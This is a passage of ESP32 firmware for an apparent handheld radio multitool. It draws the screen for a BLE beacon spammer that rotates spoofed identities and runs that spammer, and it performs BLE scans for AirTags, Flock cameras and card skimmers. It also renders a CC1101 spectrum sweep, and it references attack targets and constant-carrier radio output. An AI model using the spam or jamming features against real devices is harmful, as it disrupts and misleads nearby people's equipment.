        tft.print("BLE Swarm");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Rotating identities");

        drawBLEBeaconCard(16, 78, 208, 44, "Name", accent);
        drawBLEBeaconCard(16, 130, 100, 44, "Vendor", accent);
        drawBLEBeaconCard(124, 130, 100, 44, "Seen", accent);
        drawBLEBeaconCard(16, 182, 208, 44, "UUID", accent);

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(12, 240);
        tft.print("Addr");

        tft.setCursor(12, 255);
        tft.print("Meta");

        tft.setCursor(12, 270);
        tft.print("UP/DN secs  SEL rename  LEFT back");

        bleBeaconFirstDraw = false;
    }

    uint16_t pillColor = tft.color565(90, 90, 90);
    uint16_t pillText = ILI9341_WHITE;

    if (bleBeaconStatus == "Live") {
        pillColor = success;
        pillText = ILI9341_BLACK;
    } else if (bleBeaconStatus == "Error") {
        pillColor = danger;
    }

    tft.fillRect(148, 36, 72, 22, panelColor);
    tft.fillRoundRect(150, 38, 68, 18, 9, pillColor);
    tft.setTextColor(pillText);
    tft.setTextSize(1);
    tft.setCursor(166, 44);
    tft.print(bleBeaconStatus);

    drawBLEBeaconCard(16, 78, 208, 44, "Name", accent);
    tft.fillRect(24, 96, 192, 18, tft.color565(28, 28, 28));
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(2);
    String displayName = bleBeaconName.length() > 0 ? bleBeaconName : "Waiting...";
    if (displayName.length() > 16) displayName = displayName.substring(0, 16);
    tft.setCursor(24, 96);
    tft.print(displayName);

    drawBLEBeaconCard(16, 130, 100, 44, "Vendor", accent);
    tft.fillRect(24, 144, 84, 20, tft.color565(28, 28, 28));
    tft.fillRect(24, 158, 84, 10, tft.color565(28, 28, 28));
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(1);
    String vendorName = bleBeaconVendor.length() > 0 ? bleBeaconVendor : "Ready";
    if (vendorName.length() > 12) vendorName = vendorName.substring(0, 12);
    tft.setCursor(24, 146);
    tft.print(vendorName);
    tft.setTextColor(textSoft);
    tft.setCursor(24, 158);
    tft.print(formatBLEHex16(bleBeaconManufacturerId));

    drawBLEBeaconCard(124, 130, 100, 44, "Seen", accent);
    tft.fillRect(132, 144, 84, 22, tft.color565(28, 28, 28));
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(2);
    tft.setCursor(132, 146);
    tft.print((unsigned long)bleBeaconIdentityCount);

    drawBLEBeaconCard(16, 182, 208, 44, "UUID", accent);
    tft.fillRect(24, 198, 192, 10, tft.color565(28, 28, 28));
    tft.fillRect(24, 210, 192, 10, tft.color565(28, 28, 28));
    tft.setTextColor(ILI9341_WHITE);
    tft.setTextSize(1);
    String uuidLine1 = bleBeaconUUID.length() > 0 ? bleBeaconUUID : "Waiting for payload";
    String uuidLine2 = "";
    if (uuidLine1.length() > 18) {
        uuidLine2 = uuidLine1.substring(18);
        uuidLine1 = uuidLine1.substring(0, 18);
    }
    if (uuidLine2.length() > 18) uuidLine2 = uuidLine2.substring(0, 18);
    tft.setCursor(24, 199);
    tft.print(uuidLine1);
    tft.setCursor(24, 211);
    tft.print(uuidLine2);

    tft.fillRect(52, 240, 180, 10, bgColor);
    tft.setTextColor(textSoft);
    tft.setTextSize(1);
    String addrLine = bleBeaconAddress.length() > 0 ? bleBeaconAddress : "--:--:--:--:--:--";
    tft.setCursor(52, 240);
    tft.print(addrLine);

    tft.fillRect(52, 255, 180, 10, bgColor);
    tft.setCursor(52, 255);
    tft.print(formatBLEHex16(bleBeaconMajor));
    tft.print("/");
    tft.print(formatBLEHex16(bleBeaconMinor));
    tft.print(" ");
    tft.print(bleBeaconRotateIntervalMs);
    tft.print("ms");
}

void runBLEBeaconSpammer() {
    if (!initBLEBeaconSpammer()) {
        drawBLEBeaconSpammer();
        return;
    }

    if (bleBeaconLastRotate == 0 || millis() - bleBeaconLastRotate >= bleBeaconRotateIntervalMs) {
        rotateBLEBeaconPayload();
    }

    drawBLEBeaconSpammer();
}

bool performBLEScan(uint32_t durationMs, bool allowPassiveFallback = true, bool clearExisting = true, bool preserveWiFi = false) {
    const unsigned long now = millis();
    if (bleInitRetryAt != 0 && now < bleInitRetryAt) {
        setBLEScanStatus("BLE init cooldown", true);
        return false;
    }

    bleLastObservedCount = -1;

    radioLocked = true;

    LOG("BLE: preparing clean radio state...");

    radio1.stopListening();
    radio1.stopConstCarrier();
    radio1.powerDown();
    if (radio3Ok) {
        radio2.stopListening();
        radio2.stopConstCarrier();
        radio2.powerDown();
    }

    delay(50);

    bool keepWiFiAlive = preserveWiFi && NimBLEDevice::isInitialized();
    if (!keepWiFiAlive) {
        if (preserveWiFi) {
            stopFlockWiFiSniffer();
        }
        shutdownWiFiStack(true);
        delay(120);  // longer settle after WiFi teardown before BLE init
    }

    if (!NimBLEDevice::isInitialized()) {
        esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
        attackTargetCount = 0;

        // Aggressive heap recovery before NimBLE init
        // Release icons, reset structures, then yield to let FreeRTOS compact
        releaseTransientIconHeapForMode("BLE");
        delay(20);
        releaseTransientIconHeapForMode("BLE");
        resetBLEScanEngine();
        resetBLEPeripheralState();
        // Force FreeRTOS to reclaim any pending frees
        vTaskDelay(10 / portTICK_PERIOD_MS);
        yield();
        delay(80);

        size_t largestNow = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
        LOG(String("BLE init heap free=") + String(ESP.getFreeHeap()) +
            " largest=" + String((uint32_t)largestNow));

        // If still too tight, wait longer for heap to settle
        if (largestNow < 58000UL) {
            LOG("BLE: heap tight, extra settle...");
            delay(200);
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }
        
        if (!NimBLEDevice::init("")) {
            // One more cleanup attempt
            releaseTransientIconHeapForMode("BLE");
            delay(100);
            
            if (!NimBLEDevice::init("")) {
                LOG("BLE ERROR: init failed");
                LOG("BLE stack did not start cleanly");
                
                tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
                drawStatusBar();

                tft.setTextSize(2);
                tft.setTextColor(ILI9341_RED);
                tft.setCursor(40, 80);
                tft.print("BLE Failed");

                tft.setTextSize(1);
                tft.setTextColor(ILI9341_YELLOW);
                tft.setCursor(20, 110);
                tft.print("BLE stack did not initialize");

                tft.setTextColor(tft.color565(160,160,160));
                tft.setCursor(20, 130);
                tft.print("Try Bluetooth before WiFi.");
                tft.setCursor(20, 145);
                tft.print("If it still fails, reboot once.");

                tft.setTextColor(ILI9341_CYAN);
                tft.setCursor(20, 170);
                tft.print("SOLUTION:");
                tft.setTextColor(ILI9341_WHITE);
                tft.setCursor(20, 185);
                tft.print("1. Back out of WiFi tools");
                tft.setCursor(20, 200);
                tft.print("2. Open Bluetooth again");
                tft.setCursor(20, 215);
                tft.print("3. Reboot if still needed");

                tft.setTextColor(tft.color565(160,160,160));
                tft.setCursor(20, 240);
                tft.print("Press LEFT to go back");
                
                // Stop all retries
                bleScanRunning = false;
                bleScanWarmupRetries = 0;
                bleScanAutoRetryPending = false;
                bleInitRetryAt = 0;
                radioLocked = false;
                setBLEScanStatus("BLE init failed", true);
                
                // Return to prevent further execution
                return false;
            }
        }
        bleInitRetryAt = 0;
    }

    if (!bleScanClientConfigured || bleScanClient == nullptr) {
        NimBLEDevice::stopAdvertising();

        bleScanClient = NimBLEDevice::getScan();

        if (!bleScanClient) {
            LOG("BLE ERROR: scan null");
            resetBLEScanEngine();
            radioLocked = false;
            setBLEScanStatus("BLE scanner missing", true);
            return false;
        }

        bleScanClient->setInterval(20);   // 12.5ms interval — maximum scan rate
        bleScanClient->setWindow(20);      // 100% duty cycle
        bleScanClient->setDuplicateFilter(1); // deduplicate by MAC — prevents heap exhaustion from repeat ads
        bleScanClient->setMaxResults(80);  // increased from 40 — catch more devices per sweep
        bleScanClientConfigured = true;
    }

    NimBLEScan* pBLEScan = bleScanClient;
    if (!pBLEScan) {
        resetBLEScanEngine();
        radioLocked = false;
        setBLEScanStatus("BLE scanner missing", true);
        return false;
    }

    auto collectResults = [&](bool activeScan) {
        // Active scan: respect clearExisting. Passive scan: always append to active results.
        int count = (activeScan && clearExisting) ? 0 : bleDeviceCount;

        pBLEScan->stop();
        pBLEScan->clearResults();
        pBLEScan->setActiveScan(activeScan);

        NimBLEScanResults results = pBLEScan->getResults(durationMs, false);
        bleLastObservedCount = max(bleLastObservedCount, results.getCount());

        LOG_IF(DEBUG_VERBOSE_SCANS,
               String("BLE ") + (activeScan ? "ACTIVE" : "PASSIVE") +
               " COUNT: " + String(results.getCount()));

        const int resultCount = results.getCount();
        for (int i = 0; i < resultCount && count < MAX_SCAN_RESULTS; i++) {
            const NimBLEAdvertisedDevice* device = results.getDevice(i);
            if (!device) continue;

            String rawName = sanitizeBLEText(device->getName());
            String displayName = getBLEDisplayName(device);
            uint16_t companyId = getBLECompanyId(device);
            uint16_t primaryId = companyId;
            String hint;
            uint16_t detectFlags = bleBuildDetectFlags(device, rawName, hint, primaryId);
            String filterNameLower = displayName;
            filterNameLower.toLowerCase();
            if (rawName.length() > 0 && filterNameLower.length() == 0) {
                filterNameLower = rawName;
                filterNameLower.toLowerCase();
            }
            String filterHintLower = hint;
            filterHintLower.toLowerCase();

            if (currentRadioMode == BLE_SCAN &&
                bluetoothSnifferProfile == BT_SNIFFER_FLOCK &&
                bleComputeFlockScore(detectFlags, companyId, filterNameLower, filterHintLower, device->getRSSI()) < 4) {
                continue;
            }

            if (currentRadioMode == BLE_SCAN &&
                !bleMatchesBluetoothSnifferProfileValues(detectFlags, companyId, filterNameLower, filterHintLower)) {
                continue;
            }

            if (hint.length() > 0 && isGenericBLEName(displayName.c_str())) {
                displayName = hint;
            }

            storeBLEDeviceResult(
                displayName,
                device->getAddress().toString().c_str(),
                device->getRSSI(),
                count,
                companyId,
                detectFlags,
                hint,
                primaryId
            );

            if ((i & 0x03) == 0x03) {
                yield();
            }
        }

        bleDeviceCount = count;
        if (activeScan) {
            bleLastActiveCount = (uint8_t)min(count, MAX_SCAN_RESULTS);
        } else {
            bleLastPassiveCount = (uint8_t)min(count, MAX_SCAN_RESULTS);
        }
        sortBLEResults();
        pBLEScan->clearResults();
    };

    if (clearExisting) {
        clearBLEScanResults();
    }
    setBLEScanStatus("Active scan");
    collectResults(true);  // active scan first

    // Passive fallback: run if active scan found nothing, OR for profiles that
    // target passive-only devices (AirTags, Flock, card skimmers don't respond to active scan)
    bool needsPassive = (bleDeviceCount == 0 && allowPassiveFallback) ||
                        (allowPassiveFallback &&
                         (bluetoothSnifferProfile == BT_SNIFFER_AIRTAG ||
                          bluetoothSnifferProfile == BT_SNIFFER_FLOCK ||
                          bluetoothSnifferProfile == BT_SNIFFER_CARD_SKIMMERS));
    if (needsPassive) {
        LOG("BLE: running passive scan for passive-only devices");
        setBLEScanStatus("Passive fallback");
        collectResults(false);
    }

    pBLEScan->setActiveScan(true);
    pruneBLEScanResults(12000UL);  // 12s window — stale devices drop off faster
    sortBLEResults();

    LOG_IF(DEBUG_VERBOSE_SCANS, "BLE FINAL COUNT: " + String(bleDeviceCount));
    bleLastFilteredCount = (uint8_t)min(bleDeviceCount, MAX_SCAN_RESULTS);
    if (bleDeviceCount > 0) {
        char statusLine[32];
        snprintf(statusLine, sizeof(statusLine), "A%d P%d F%d",
                 bleLastActiveCount, bleLastPassiveCount, bleLastFilteredCount);
        setBLEScanStatus(statusLine);
    } else {
        setBLEScanStatus("No BLE devices");
    }
    if (preserveWiFi) {
        ensureFlockWiFiSniffer(!keepWiFiAlive);
    }
    if (currentRadioMode == BLE_SCAN && bluetoothSnifferProfile != BT_SNIFFER_ANALYZER &&
        !(preserveWiFi && bluetoothSnifferProfile == BT_SNIFFER_FLOCK)) {
        saveBLESavedMacSnapshot();
    }
    bleInitRetryAt = 0;
    radioLocked = false;
    return bleDeviceCount > 0;
}

void runBLEScan() {
    if (bleScanCancelRequested || !isBLEMode(currentRadioMode)) {
        bleScanRunning = false;
        bleScanStartedAt = 0;
        bleScanReadyAt = 0;
        bleContinuousScanAt = 0;
        bleAnalyzerNextScanMs = 0;
        radioLocked = false;
        return;
    }

    // Scan durations — active + passive combined must stay under 20s watchdog
    const uint32_t scanDurationMs = (currentRadioMode == BLE_SIGNAL_LOGGER_PICK) ? 2000UL :
                                    (bluetoothSnifferProfile == BT_SNIFFER_GENERAL)       ? 2500UL :
                                    (bluetoothSnifferProfile == BT_SNIFFER_AIRTAG)        ? 5000UL :
                                    (bluetoothSnifferProfile == BT_SNIFFER_FLOCK)         ? 4500UL :
                                                                                           2000UL;
    bool analyzerMode = (currentRadioMode == BLE_SCAN && bluetoothSnifferProfile == BT_SNIFFER_ANALYZER);
    bool hybridFlockMode = (currentRadioMode == BLE_SCAN && bluetoothSnifferProfile == BT_SNIFFER_FLOCK);
    setBLEScanStatus(analyzerMode ? "Sampling BLE" : "Scanning BLE");
    bool foundDevices = performBLEScan(scanDurationMs, true, !blePreserveResultsOnNextScan, hybridFlockMode);
    if (bleScanCancelRequested || !isBLEMode(currentRadioMode)) {
        bleScanRunning = false;
        bleScanStartedAt = 0;
        bleScanReadyAt = 0;
        bleContinuousScanAt = 0;
        bleAnalyzerNextScanMs = 0;
        radioLocked = false;
        return;
    }
    if (hybridFlockMode) {
        drainFlockWiFiAlerts();
        if (bleDeviceCount > 0) {
            saveBLESavedMacSnapshot();
        }
    }

    if (analyzerMode) {
        if (bleLastObservedCount >= 0) {
            pushBLEAnalyzerSample(bleLastObservedCount);
        }

        bleScanAutoRetryPending = false;
        bleScanWarmupRetries = 0;
        bleScanRunning = false;
        bleScanStartedAt = 0;
        bleScanReadyAt = 0;
        bleAnalyzerNextScanMs = (bleLastObservedCount >= 0) ? (millis() + 700UL) : 0;
        bleContinuousScanAt = 0;
        blePreserveResultsOnNextScan = false;
        bleNeedsRedraw = true;
        return;
    }

    if (!foundDevices && bleScanWarmupRetries > 0) {
        if (bleScanCancelRequested || !isBLEMode(currentRadioMode)) {
            bleScanRunning = false;
            bleScanStartedAt = 0;
            bleScanReadyAt = 0;
            bleContinuousScanAt = 0;
            radioLocked = false;
            return;
        }
        bleScanWarmupRetries--;
        LOG("BLE warmup retry -> " + String(bleScanWarmupRetries));
        bleScanRunning = true;
        bleScanStartedAt = 0;
        bleScanReadyAt = millis() + 520UL;
        setBLEScanStatus("Retrying scan");
        bleNeedsRedraw = true;
        return;
    }

    if (!foundDevices && !NimBLEDevice::isInitialized()) {
        bleScanAutoRetryPending = false;
        bleScanWarmupRetries = 0;
        bleScanRunning = false;
        bleScanStartedAt = 0;
        bleScanReadyAt = 0;
        bleAnalyzerNextScanMs = 0;
        blePreserveResultsOnNextScan = false;
        bleContinuousScanAt = 0;
        setBLEScanStatus("BLE scan stopped", true);
        bleNeedsRedraw = true;
        return;
    }

    bleScanAutoRetryPending = false;
    bleScanWarmupRetries = 0;
    bleScanRunning = false;
    bleScanStartedAt = 0;
    bleScanReadyAt = 0;
    bleAnalyzerNextScanMs = 0;
    blePreserveResultsOnNextScan = true;
    bleContinuousScanAt = (bleScanCancelRequested || !isBLEMode(currentRadioMode)) ? 0 :
                          millis() + (bluetoothSnifferProfile == BT_SNIFFER_GENERAL ? 800UL :
                                       bluetoothSnifferProfile == BT_SNIFFER_AIRTAG ? 1400UL :
                                       hybridFlockMode ? 1100UL : 600UL);
    if (foundDevices) {
        char statusLine[32];
        snprintf(statusLine, sizeof(statusLine), "Watching %d device%s",
                 bleDeviceCount, bleDeviceCount == 1 ? "" : "s");
        setBLEScanStatus(statusLine);
    }
    // BUG FIX 1.17: Only set bleNeedsRedraw if device count actually changed
    static int lastBLEDeviceCount = -1;
    if (bleDeviceCount != lastBLEDeviceCount) {
        lastBLEDeviceCount = bleDeviceCount;
        bleNeedsRedraw = true;
    }
}

void bleScanTask(void *parameter) {
    TaskHandle_t currentHandle = xTaskGetCurrentTaskHandle();
    bool runningAsTask = (bleScanTaskHandle != NULL && currentHandle == bleScanTaskHandle);
    bleScanWorkerActive = true;
    runBLEScan();
    bleScanWorkerActive = false;
    bleScanTaskHandle = NULL;
    if (runningAsTask) {
        vTaskDelete(NULL);
    }
}

int findBLEDeviceByMAC(const String& mac) {
    if (mac.length() == 0) return -1;

    for (int i = 0; i < bleDeviceCount; i++) {
        if (strcmp(bleMACs[i], mac.c_str()) == 0) {
            return i;
        }
    }

    return -1;
}

void chooseBLELoggerTarget() {
    if (strlen(bleFocusedMAC) > 0) {
        bleLoggerTargetMAC = String(bleFocusedMAC);
        bleLoggerTargetName = strlen(bleFocusedName) > 0 ? String(bleFocusedName) : String(bleFocusedMAC);
        bleLoggerTargetIndex = findBLEDeviceByMAC(String(bleFocusedMAC));
        return;
    }

    if (bleDeviceCount > 0) {
        bleLoggerTargetIndex = 0;
        bleLoggerTargetMAC = String(bleMACs[0]);
        bleLoggerTargetName = String(bleNames[0]);
        strncpy(bleFocusedMAC, bleMACs[0], 17);
        bleFocusedMAC[17] = '\0';
        strncpy(bleFocusedName, bleNames[0], 31);
        bleFocusedName[31] = '\0';
        bleFocusedRSSI = bleRSSI[0];
    }
}

void setBLELoggerTargetByIndex(int index) {
    if (bleDeviceCount <= 0) return;

    if (index < 0) index = bleDeviceCount - 1;
    if (index >= bleDeviceCount) index = 0;

    bleLoggerTargetIndex = index;
    bleLoggerTargetMAC = String(bleMACs[index]);
    bleLoggerTargetName = String(bleNames[index]);
    strncpy(bleFocusedMAC, bleMACs[index], 17);
    bleFocusedMAC[17] = '\0';
    strncpy(bleFocusedName, bleNames[index], 31);
    bleFocusedName[31] = '\0';
    bleFocusedRSSI = bleRSSI[index];
}

void syncBLELoggerTargetIndex() {
    if (bleLoggerTargetMAC.length() == 0) {
        bleLoggerTargetIndex = -1;
        return;
    }

    int currentIndex = findBLEDeviceByMAC(bleLoggerTargetMAC);
    if (currentIndex >= 0) {
        bleLoggerTargetIndex = currentIndex;
        return;
    }

    bleLoggerTargetIndex = -1;
}

void cycleBLELoggerTarget(int delta) {
    if (bleDeviceCount <= 0) {
        return;
    }

    syncBLELoggerTargetIndex();
    int nextIndex = bleLoggerTargetIndex + delta;

    while (nextIndex < 0) nextIndex += bleDeviceCount;
    while (nextIndex >= bleDeviceCount) nextIndex -= bleDeviceCount;

    setBLELoggerTargetByIndex(nextIndex);
    resetBLELoggerBuffer();
    bleLoggerNeedsRedraw = true;
}

void stopBLERadar() {
    resetBLERadarState();
    radioLocked = false;
}

void stopBLELogger() {
    bleLoggerFirstDraw = true;
    bleLoggerNeedsRedraw = true;
    bleLoggerLastSampleMs = 0;
    bleLoggerTargetIndex = -1;
    bleLoggerTargetName = "";
    bleLoggerTargetMAC = "";
    resetBLELoggerBuffer();
    bleScanStartedAt = 0;
    bleScanTaskHandle = NULL;
    radioLocked = false;
}

uint8_t rfLevelFromRSSI(int rssi) {
    // Map -110 to -40 dBm → 0 to 100. Dynamic noise floor in scanner handles suppression.
    return (uint8_t)constrain(map(rssi, -110, -40, 0, 100), 0, 100);
}

String rfBandLabel() {
    return String(rfBandPresets[rfBandIndex].label) + " MHz";
}

float rfSweepFrequencyForIndex(int index) {
    const RFBandPreset &band = rfBandPresets[rfBandIndex];
    if (RF_SWEEP_POINTS <= 1) {
        return band.centerMHz;
    }
    return band.startMHz + ((band.endMHz - band.startMHz) * index) / (RF_SWEEP_POINTS - 1);
}

String rfSweepBandLabel() {
    return String(rfBandPresets[rfBandIndex].label) + " MHz";
}

int cc1101MeasureSweepRSSI(float mhz, int sampleIndex) {
    const bool recalibrate = (sampleIndex == 0) || ((sampleIndex % 12) == 0);

    if (recalibrate) {
        cc1101SetFrequencyMHz(mhz);   // full calibration + settle
    } else {
        cc1101SetFrequencyMHzQuick(mhz);  // quick tune + settle
    }

    // Let AGC settle after retune before trusting RSSI.
    (void)cc1101ReadRSSI();
    delayMicroseconds(recalibrate ? 180 : 140);
    int rssiA = cc1101ReadRSSI();
    delayMicroseconds(60);
    int rssiB = cc1101ReadRSSI();
    delayMicroseconds(60);
    int rssiC = cc1101ReadRSSI();

    if (rssiA > rssiB) std::swap(rssiA, rssiB);
    if (rssiB > rssiC) std::swap(rssiB, rssiC);
    if (rssiA > rssiB) std::swap(rssiA, rssiB);

    return rssiB;
}

void resetRFUICache() {
    for (int i = 0; i < 2; i++) {
        rfStatCacheLeft[i] = "";
        rfStatCacheRight[i] = "";
        rfStatCacheMode[i] = -1;
    }
    for (int i = 0; i < 3; i++) {
        rfFooterCache[i] = "";
        rfFooterCacheMode[i] = -1;
    }
}

void drawRFScreenHeader(const char* title, const char* subtitle) {
    resetRFUICache();
    tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
    tft.drawFastHLine(10, 68, 220, tft.color565(52, 52, 52));
    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(18, 40);
    tft.print(title);
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160, 160, 160));
    tft.setCursor(18, 58);
    tft.print(subtitle);
}

bool drawRFUnavailable(const char* title, const char* subtitle) {
    drawRFScreenHeader(title, subtitle);
    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(30, 124);
    tft.print(cc1101Ok ? "CC1101 Not Ready" : "CC1101 Missing");
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(170, 170, 170));
    if (cc1101Ok) {
        tft.setCursor(28, 154);
        tft.print("Re-enter tool or change mode");
        tft.setCursor(38, 170);
        tft.print("RF state was not prepared");
    } else {
        tft.setCursor(34, 154);
        tft.print("Connect CS to GPIO22");
        tft.setCursor(28, 170);
        tft.print("Shared SPI: 18 / 19 / 23");
    }
    tft.setCursor(68, 284);
    tft.print("LEFT back");
    return false;
}

void drawRFStatLine(int y, const String& left, const String& right) {
    int slot = (y < 80) ? 0 : 1;
    if (rfStatCacheMode[slot] == (int)currentRadioMode &&
        rfStatCacheLeft[slot] == left &&
        rfStatCacheRight[slot] == right) {
        return;
    }

    tft.fillRect(12, y, 216, 12, ILI9341_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(170, 170, 170));
    tft.setCursor(12, y + 2);
    tft.print(left);
    tft.setTextColor(ILI9341_WHITE);
    int16_t x1, y1;
    uint16_t w, h;
    tft.getTextBounds(right, 0, 0, &x1, &y1, &w, &h);
    tft.setCursor(228 - (int)w, y + 2);
    tft.print(right);

    rfStatCacheMode[slot] = (int)currentRadioMode;
    rfStatCacheLeft[slot] = left;
    rfStatCacheRight[slot] = right;
}

void drawRFFooterLine(int slot, int y, const String& text) {
    if (slot < 0 || slot >= 3) return;
    if (rfFooterCacheMode[slot] == (int)currentRadioMode &&
        rfFooterCache[slot] == text) {
        return;
    }

    tft.fillRect(12, y, 216, 12, ILI9341_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160, 160, 160));
    tft.setCursor(12, y);
    tft.print(text);

    rfFooterCacheMode[slot] = (int)currentRadioMode;
    rfFooterCache[slot] = text;
}

uint16_t getRFSweepWaterfallColor(uint8_t level) {
    float norm = constrain(level / 100.0f, 0.0f, 1.0f);

    if (norm < 0.08f) return tft.color565(2, 4, 12);
    if (norm < 0.18f) return tft.color565(6, 10, 28);
    if (norm < 0.30f) return tft.color565(10, 24, 74);
    if (norm < 0.42f) return tft.color565(16, 60, 152);
    if (norm < 0.56f) return tft.color565(20, 136, 222);
    if (norm < 0.70f) return tft.color565(84, 214, 255);
    if (norm < 0.82f) return tft.color565(255, 232, 112);
    if (norm < 0.92f) return tft.color565(255, 164, 48);
    return tft.color565(255, 74, 18);
}

void renderRFSweepSpectrum(bool fullRedraw) {
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t grid = tft.color565(42, 42, 42);
    const uint16_t gridStrong = tft.color565(70, 70, 70);
    const uint16_t trace = ILI9341_WHITE;
    const uint16_t peakLine = tft.color565(255, 64, 64);
    const uint16_t tuneLine = tft.color565(96, 220, 120);
    const uint16_t fill = tft.color565(18, 74, 164);
    const uint16_t fillSoft = tft.color565(8, 34, 84);
    const int graphBottom = RF_SWEEP_GRAPH_H - 1;
    const size_t pixelCount = RF_SWEEP_GRAPH_W * RF_SWEEP_GRAPH_H;

    for (size_t i = 0; i < pixelCount; i++) {
        rfSweepSpectrumBuffer[i] = bg;
        if ((i & 0x7FF) == 0x7FF) {
            yield();
        }
    }

    auto plot = [&](int x, int y, uint16_t color) {
        if (x < 0 || x >= RF_SWEEP_GRAPH_W || y < 0 || y >= RF_SWEEP_GRAPH_H) {
            return;
        }
        rfSweepSpectrumBuffer[(y * RF_SWEEP_GRAPH_W) + x] = color;
    };

    auto drawVLine = [&](int x, int yStart, int length, uint16_t color) {
        for (int i = 0; i < length; i++) {
            plot(x, yStart + i, color);
        }
    };

    auto drawLine = [&](int x0, int y0, int x1, int y1, uint16_t color) {
        int dx = abs(x1 - x0);
        int sx = x0 < x1 ? 1 : -1;
        int dy = -abs(y1 - y0);
        int sy = y0 < y1 ? 1 : -1;
        int err = dx + dy;

        while (true) {
            plot(x0, y0, color);
            if (x0 == x1 && y0 == y1) {
                break;
            }
            int e2 = err * 2;
            if (e2 >= dy) {
                err += dy;
                x0 += sx;
            }
            if (e2 <= dx) {
                err += dx;
                y0 += sy;
            }
        }
    };

    for (int i = 0; i <= 4; i++) {
        int y = ((RF_SWEEP_GRAPH_H - 1) * i) / 4;
        uint16_t color = (i == 4) ? gridStrong : grid;
        for (int x = 0; x < RF_SWEEP_GRAPH_W; x++) {
            plot(x, y, color);
        }
        yield();
    }

    for (int i = 1; i < 4; i++) {
        int x = (RF_SWEEP_GRAPH_W * i) / 4;
        drawVLine(x, 0, RF_SWEEP_GRAPH_H, grid);
    }

    int peakIndex = 0;
    uint8_t peakLevel = 0;
    int prevY = graphBottom;

    for (int x = 0; x < RF_SWEEP_GRAPH_W; x++) {
        int sampleIndex = (x * (RF_SWEEP_POINTS - 1)) / max(1, RF_SWEEP_GRAPH_W - 1);
        uint8_t level = orionToolsCombinedLevel(rfSweepLevels[sampleIndex], rfSweepPeakHold[sampleIndex]);
        if (level >= peakLevel) {
            peakLevel = level;
            peakIndex = x;
        }

        int height = max(1, (int)((level * (RF_SWEEP_GRAPH_H - 6)) / 100.0f));
        int y = graphBottom - height;
        drawVLine(x, y, height, fill);
        if (height > 8) {
            drawVLine(x, y + (height / 2), height / 2, fillSoft);
        }

        if (x > 0) {
            drawLine(x - 1, prevY, x, y, trace);
        } else {
            plot(x, y, trace);
        }
        prevY = y;

        if ((x & 0x1F) == 0x1F) {
            yield();
        }
    }

    drawVLine(peakIndex, 2, RF_SWEEP_GRAPH_H - 4, peakLine);

    int tuneIndex = map((int)(rfLockedFrequencyMHz * 100.0f),
                        (int)(getCurrentRFBandStart() * 100.0f),
                        (int)(getCurrentRFBandEnd() * 100.0f),
                        0, RF_SWEEP_GRAPH_W - 1);
    tuneIndex = constrain(tuneIndex, 0, RF_SWEEP_GRAPH_W - 1);
    drawVLine(tuneIndex, 2, RF_SWEEP_GRAPH_H - 4, tuneLine);

    tft.startWrite();
    tft.drawRGBBitmap(RF_SWEEP_GRAPH_X,
                      RF_SWEEP_GRAPH_Y,
                      rfSweepSpectrumBuffer,
                      RF_SWEEP_GRAPH_W,
                      RF_SWEEP_GRAPH_H);
    tft.endWrite();

    String bandText = rfSweepBandLabel();
    int16_t bandX1, bandY1;
    uint16_t bandW, bandH;
    tft.getTextBounds(bandText, 0, 0, &bandX1, &bandY1, &bandW, &bandH);
    int pillW = max(74, (int)bandW + 18);
    int pillX = RF_SWEEP_GRAPH_X + ((RF_SWEEP_GRAPH_W - pillW) / 2);
    const int pillY = RF_SWEEP_GRAPH_Y + RF_SWEEP_GRAPH_H + 4;
    tft.fillRect(RF_SWEEP_GRAPH_X + 40, pillY - 1, RF_SWEEP_GRAPH_W - 80, 14, ILI9341_BLACK);
    tft.fillRoundRect(pillX, pillY, pillW, 12, 5, tft.color565(18, 18, 18));
    tft.drawRoundRect(pillX, pillY, pillW, 12, 5, tft.color565(64, 64, 64));
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(pillX + ((pillW - (int)bandW) / 2), pillY + 2);
    tft.print(bandText);

    if (fullRedraw) {
        tft.fillRect(0, RF_SWEEP_GRAPH_Y - 2, RF_SWEEP_GRAPH_X - 2, RF_SWEEP_GRAPH_H + 6, ILI9341_BLACK);
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(150, 150, 150));
        tft.setCursor(2, RF_SWEEP_GRAPH_Y - 2);
        tft.print("-20");
        tft.setCursor(2, RF_SWEEP_GRAPH_Y + (RF_SWEEP_GRAPH_H / 2) - 5);
        tft.print("-70");
        tft.setCursor(2, RF_SWEEP_GRAPH_Y + RF_SWEEP_GRAPH_H - 8);
        tft.print("-120");

    }
}

void pushRFSweepWaterfallRow() {
    const size_t rowPixels = RF_SWEEP_WATERFALL_W;
    const size_t totalPixels = RF_SWEEP_WATERFALL_W * RF_SWEEP_WATERFALL_H;
    if (totalPixels > rowPixels) {
        memmove(rfSweepWaterfallBuffer + rowPixels,
                rfSweepWaterfallBuffer,
                sizeof(uint16_t) * (totalPixels - rowPixels));
    }

    for (int x = 0; x < RF_SWEEP_WATERFALL_W; x++) {
        int sampleIndex = (x * (RF_SWEEP_POINTS - 1)) / max(1, RF_SWEEP_WATERFALL_W - 1);
        uint8_t lv = rfSweepLevels[sampleIndex];
        uint8_t neighborMax = 0;
        if (sampleIndex > 0) {
            neighborMax = max(neighborMax, rfSweepLevels[sampleIndex - 1]);
        }
        if (sampleIndex < RF_SWEEP_POINTS - 1) {
            neighborMax = max(neighborMax, rfSweepLevels[sampleIndex + 1]);
        }
